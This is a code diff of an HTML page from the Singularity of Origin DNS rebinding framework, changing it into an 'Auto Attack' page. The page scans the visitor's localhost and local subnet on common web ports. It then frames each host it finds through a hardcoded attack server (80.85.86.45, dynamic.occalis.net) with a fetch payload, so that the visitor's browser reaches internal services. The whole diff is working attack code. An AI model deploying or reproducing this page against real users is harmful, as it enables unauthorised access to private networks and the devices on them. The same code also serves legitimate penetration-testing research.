@@ -2,7 +2,7 @@
 <html lang="en">
 
 <head>
-    <title>Singularity of Origin DNS Rebinding Attack Manager</title>
+    <title>Singularity of Origin DNS Rebinding Auto Attack</title>
     <script src="manager.js"></script>
     <script src=scan-manager.js></script>
     <meta charset="utf-8">
@@ -11,24 +11,28 @@
 
 <body>
     <script>
-        const attackHostIpAddress = "80.85.86.45";
-        const attackHostDomain = "dynamic.occalis.net";
+        const configuration = {
+            attackHostIPAddress: '80.85.86.45',
+            attackHostDomain: 'dynamic.occalis.net',
+            rebindingStrategy: 'FromQueryFirstThenSecond',
+            //const rebindingStrategy = 'FromQueryMultiA',
+            interval: "20",
+            indexToken: "<!--thisismytesttoken-->"
+        };
+        
+        app.getConfiguration().setManually(configuration);
+
         const addrSpec = `127.0.0.1,0.0.0.0`;
         const portSpec = '80,8080-8090';
-        const rebindingStrategy = "FromQueryFirstThenSecond";
-        //const rebindingStrategy = "FromQueryMultiA";
-        const payload = "payload-simple-fetch-get.html";
-        const interval = "20";
+        const payload = 'payload-simple-fetch-get.html';
 
-        let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";
-
-        function resultFn(result) {
+        function scanFoundNewTargetCb(result) {
             console.log(result);
             document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
-            attackTarget(result.target.address, result.target.port)
+            attackTarget(result.target.address, result.target.port, payload)
         }
 
-        function doneFn(results) {
+        function scanDoneCb(results) {
             document.getElementById("activity").innerHTML += "Done.<br/>";
             setTimeout(function () {
                 sm.shutDown();
@@ -39,33 +43,26 @@
             sm = ScanManager();
             getLocalIpAddress()
                 .then(address => {
-                        const range = `${address.split('.', 3).join('.')}.1-255`;
-                        sm.run(`${addrSpec},${range}`, portSpec, resultFn, doneFn);
+                        const range = `${address.split('.', 3).join('.')}.1-254`;
+                        sm.run(`${addrSpec},${range}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
                     },
                     e => {
                         console.log(e);
-                        sm.run(`${addrSpec},192.168.1.1-255`, portSpec, resultFn, doneFn);
+                        sm.run(`${addrSpec},192.168.1.1-254`, portSpec, scanFoundNewTargetCb, scanDoneCb);
 
                     })
         }
 
         getLocalIpAddressThenScan2();
 
-        function attackTarget(targetAddress, targetPort) {
+        function attackTarget(targetAddress, targetPort, payload) {
             let self = this;
-            let fid = app.getFrameManager().addFrame(hosturl
-                .replace("%1", attackHostIpAddress)
-                .replace("%2", targetAddress) // replace(/-/g, '--'))
-                .replace("%3", Math.floor(Math.random() * Math.floor(Number.MAX_SAFE_INTEGER)))
-                .replace("%4", rebindingStrategy)
-                .replace("%5", attackHostDomain)
-                .replace("%6", targetPort)
-                .replace("%7", payload + "?rnd=" + Math.random()));
+            let fid = app.getFrameManager().addFrame(app.generateAttackUrl(targetAddress, targetPort, payload))
 
             app.addFrameToDOM(app.getFrameManager().frame(fid));
             app.getFrameManager().frame(fid).setTimer(setInterval((() => {
                 app.reloadAttackFrame(app.getFrameManager().frame(fid))
-            }), parseInt(interval) * 1000));
+            }), parseInt(app.getConfiguration().getInterval()) * 1000));
 
         }
     </script>
